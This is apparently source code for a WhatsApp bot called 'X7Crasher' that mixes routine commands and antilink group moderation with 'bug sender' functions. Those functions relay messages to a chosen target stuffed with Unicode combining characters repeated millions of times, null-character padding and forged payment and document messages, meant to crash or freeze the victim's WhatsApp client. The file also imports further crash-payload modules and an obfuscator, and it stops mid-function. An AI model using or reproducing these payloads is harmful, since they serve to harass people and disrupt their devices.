module.exports = async (Revan, m, store) => {
try {
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
/*const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : */
const prefix = "."
const isCmd = body.startsWith(prefix)
const from = m.key.remoteJid
const To = ["https://img100.pixhost.to/images/590/539272068_skyzopedia.jpg"]
const ytta = To[Math.floor(Math.random() * To.length)]
const ytt = Tol[Math.floor(Math.random() * Tol.length)]
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const Premium = JSON.parse(fs.readFileSync('./Databases/database/murbug.json'))
const owner = JSON.parse(fs.readFileSync('./Databases/database/owner.json'))
const sound6 = pol[Math.floor(Math.random() * pol.length)]
const cmd = prefix + command
const args = body.trim().split(/ +/).slice(1)
const makeid = crypto.randomBytes(3).toString('hex')
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const text = q = args.join(" ")
const jsobfus = require('javascript-obfuscator');
const botNumber = await Revan.decodeJid(Revan.user.id)
const isOwner = m.sender == owner+"@s.whatsapp.net" ? true : m.sender == botNumber ? true : false
const isPremium = [botNumber, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
 const kontol = m.key.fromMe ? Revan.user.id.split(':')[0x0] + '@s.whatsapp.net' || Revan.user.id : m.key.participant || m.key.remoteJid;
const isGroup = m.chat.endsWith('@g.us')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const senderNumber = m.sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await Revan.groupMetadata(m.key.remoteJid) : {}
let participant_bot = (isGroup ? groupMetadata.participants.find((v) => v.id == m.botNumber) : {}) || {}
let participant_sender = (isGroup ? groupMetadata.participants.find((v) => v.id == m.sender) : {}) || {}
const isBotAdmin = participant_bot?.admin !== null ? true : false
const isAdmin = participant_sender?.admin !== null ? true : false
const qtext = q = args.join(" ")
const { runtime, getRandom, getTime, tanggal, toRupiah, ucapan, generateProfilePicture, getBuffer, fetchJson } = require('./Databases/function.js')
const antilink = JSON.parse(fs.readFileSync('./Databases/database/antilink.json'))
const antilink2 = JSON.parse(fs.readFileSync('./Databases/database/antilink2.json'))
const contacts = JSON.parse(fs.readFileSync("./Databases/database/contacts.json"))
const zkosong = fs.readFileSync("./Databases/zkosong.jpg")
const { RevanNewCrash } = require("./Virtext/RevanNewCrash.js")
const { RevanNewCrashV2 } = require("./Virtext/RevanNewCrashV2.js")
const { rv } = require("./Virtext/rv.js")
const { VipCrashRevan } = require("./Virtext/VipCrashRevan.js")
const { Virus } = require("./Virtext/Virus.js")
const { AutoCrasher } = require("./Virtext/AutoCrasher.js")
const { BugUrlRevan } = require("./Virtext/BugUrlRevan.js")
const { RevanEzCrash } = require("./Virtext/RevanEzCrash.js")
const { RevanEzCrashV2 } = require("./Virtext/RevanEzCrash.js")
const { beta1, beta2, buk1 } = require("./Virtext/hdr.js")
const { old1, old2, old3 } = require("./Virtext/bugold.js")

/*FUNCTION OBFUSCATE*/
async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `XPanzZyy - Official`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}


if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(owner), color(`[ PESAN ]`, `blue`), color(`FROM`, `blue`), color(`${senderNumber}`, `blue`), color(`Text :`, `blue`), color(`${cmd}`, `white`))
}

const qbug = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {listResponseMessage: {title: `⌁⃰X7Crasher⺓`
}}}

if (isGroup) {
if (antilink.includes(m.chat)) {
if (!isBotAdmin) return
if (!isAdmin && !isOwner && !m.fromMe) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text)) {
var gclink = (`https://chat.whatsapp.com/` + await Revan.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await Revan.sendMessage(m.chat, {text: `@${m.sender.split("@")[0]} Maaf Kamu Akan Saya Keluarkan Dari Grup Ini Karna Admin/Owner Bot Menyalakan Fitur *Antilink* Grup Lain!`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnailUrl: "https://h.top4top.io/p_3220inuij9.png", title: "｢ LINK GRUP DETECTED ｣", previewType: "PHOTO"}}}, {quoted: m})
await Revan.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await Revan.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}
}}}

if (isGroup) {
if (antilink2.includes(m.chat)) {
if (!isBotAdmin) return
if (!isAdmin && !isOwner && !m.fromMe) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text)) {
var gclink = (`https://chat.whatsapp.com/` + await Revan.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await Revan.sendMessage(m.chat, {text: `@${m.sender.split("@")[0]} Maaf Pesan Kamu Saya Hapus Karna Admin/Owner Bot Menyalakan Fitur *Antilink* Grup Lain!`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnailUrl: "https://h.top4top.io/p_3220inuij9.png", title: "｢ LINK GRUP DETECTED ｣", previewType: "PHOTO"}}}, {quoted: m})
await Revan.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
}
}}}

const qloc = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `Bot Whatsapp Realtime`,jpegThumbnail: ""}}}

const qloc2 = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `⌁⃰X7Crasher⺓`,jpegThumbnail: ""}}}

const qchanel = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363224727390375@newsletter`,
newsletterName: `⌁⃰X7Crasher⺓`,
jpegThumbnail: "",
caption: `⌁⃰X7Crasher⺓`,
inviteExpiration: Date.now() + 1814400000
}
}}

const Out = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...(from ? {
remoteJid :"status@broadcast"
 }: {})},
 message:
 {"orderMessage":
 {"orderId":"174238614569438",
 "thumbnailUrl": kosong, //image 0kb
 "itemCount": 999999999,
 "status":
 "INQUIRY",
 "surface": "CATALOG",
 "message": `⌁⃰X7Crasher⺓`,
 "token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA==" }},
 contextInfo: {"mentionedJid":m.sender.split, "forwardingScore":999,"isForwarded":true}}

const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `⌁⃰X7Crasher⺓`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6287827536016:+6287827536016\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}

let example = (teks) => {
return `\n*Contoh Penggunaan :*\nketik *${cmd}* ${teks}\n`
}

Revan.ments = (teks = '') => {
return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : []
};

var resize = async (image, width, height) => {
let oyy = await Jimp.read(image)
let kiyomasa = await oyy.resize(width, height).getBufferAsync(Jimp.MIME_JPEG)
return kiyomasa
}

async function loadingx() {
      var loadingz = [
        "> 🕘 • 𝙋𝙡𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 : 3",
        "> 🕣 • 𝙋𝙡𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 : 3",
        "> 🕠 • 𝙋𝙡𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 : 3",
        "> 🕔 • 𝙋𝙡𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 : 2",
        "> 🕟 • 𝙋𝙡𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 : 2",
        "> 🕔 • 𝙋𝙡𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 : 1",
        "> 🕔 • 𝙋𝙡𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 : 1",
        "> 🕐 • 𝙋𝙡𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 : 0",
        "> 🕧 • 𝙋𝙡𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 : 0",
        "*𝙎𝙀𝙉𝘿 𝘽𝙐𝙂 𝙎𝙐𝘾𝘾𝙀𝙎𝙎 ✅*",
      ];
      let { key } = await Revan.sendMessage(m.chat, {
        text: "𝗢𝗸𝗲 𝗢𝘁𝘄 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴🤙",
      });

      for (let i = 0; i < loadingz.length; i++) {
        await sleep(400);
        await Revan.sendMessage(m.chat, { text: loadingz[i], edit: key });
      }
    }
async function loading () {
var baralod = [
"█▒▒▒▒▒▒▒▒▒10%",
"████▒▒▒▒▒▒30%", 
"████████▒▒80%", 
"██████████100%",
"X7Crasher Botz", 
]
let { key } = await zyn.sendMessage(from, {text: 'P'})

for (let i = 0; i < baralod.length; i++) {
await zyn.sendMessage(from, {text: baralod[i], edit: key });
}
}

function capital(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}

const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
//=================== [ Quoted Bug Sender ] =============\\
const Null = {
key: {
remoteJid: 'cihuy',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
"interactiveResponseMessage": {
"body": {
"text": "Sent",
"format": "DEFAULT"
},
"nativeFlowResponseMessage": {
"name": "galaxy_message",
"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"⌁⃰X7Crasher⺓@EzCrash.TrashID\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(500000)}\",\"screen_0_TextInput_1\":\"cihuy\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
"version": 3
}
}
}
}
const Porke = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			'message': {
				"interactiveMessage": {
					"header": {
						"hasMediaAttachment": true,
						"jpegThumbnail": fs.readFileSync(`./Databases/zkosong.png`)
					},
					"nativeFlowMessage": {
						"buttons": [{
							"name": "review_and_pay",
							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰ZephyrudAttackβΩT͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":25}]},\"native_payment_methods\":[]}`
						}]
					}
				}
			}
		}
const Porke2 = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			'message': {
				"interactiveMessage": {
					"header": {
						"hasMediaAttachment": true,
						"jpegThumbnail": fs.readFileSync(`./Databases/zkosong.png`)
					},
					"nativeFlowMessage": {
						"buttons": [{
							"name": "review_and_pay",
							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰ZephyrusAttack🦄βΩT͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":25},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":10}]},\"native_payment_methods\":[]}`
						}]
					}
				}
			}
		}
const wanted = {
            key: {
                remoteJid: 'p',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "Sent",
                        "format": "DEFAULT"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"⌁⃰X7Crasher⺓\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }
//=================== [ Bug Sender ] =============\\
async function locasifreeze(bugtarg, ptcp = false) {
    await xin.relayMessage(bugtarg, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "⌁⃰͢͢X͢7͢C͢r͢a͢s͢h͢e͢r々U͢l͢t͢r͢a͢C͢r͢a͢s͢h͢e͢r͢⌁⃰" + "々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰".repeat(9999999) + "͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢".repeat(9999999) + "📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰".repeat(9999999) + "̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉".repeat(9999999) + " ͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥".repeat(9999999) + "i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i".repeat(9999999) + " ͢ ͢͢꧅꙰꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰".repeat(9999999)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "⌁⃰͢͢X͢7͢C͢r͢a͢s͢h͢e͢r々U͢l͢t͢r͢a͢C͢r͢a͢s͢h͢e͢r͢⌁⃰" }]
                    }
                }
            }
        }
    }, { participant: { jid: bugtarg } }, { messageId: null });
}

async function uidoc3(bugtarg, ptcp = false) {
    let akumw = "⌁⃰͢͢X͢7͢C͢r͢a͢s͢h͢e͢r々U͢l͢t͢r͢a͢C͢r͢a͢s͢h͢e͢r͢⌁⃰" + "々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰".repeat(9999999) + "͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢".repeat(9999999) + "📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰".repeat(9999999) + "̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉".repeat(9999999) + " ͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥".repeat(9999999) + "i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i".repeat(9999999) + " ͢ ͢͢꧅꙰꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰".repeat(9999999)
    await xin.relayMessage(bugtarg, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: " TrashDex Explanation ",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "⌁⃰͢͢X͢7͢C͢r͢a͢s͢h͢e͢r々U͢l͢t͢r͢a͢C͢r͢a͢s͢h͢e͢r͢⌁",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: akumw
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "anjay" }]
                    }
                }
            }
        }
    }, { participant: { jid: bugtarg } }, { messageId: null });
}
async function VampireBug5(Vampire, quoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
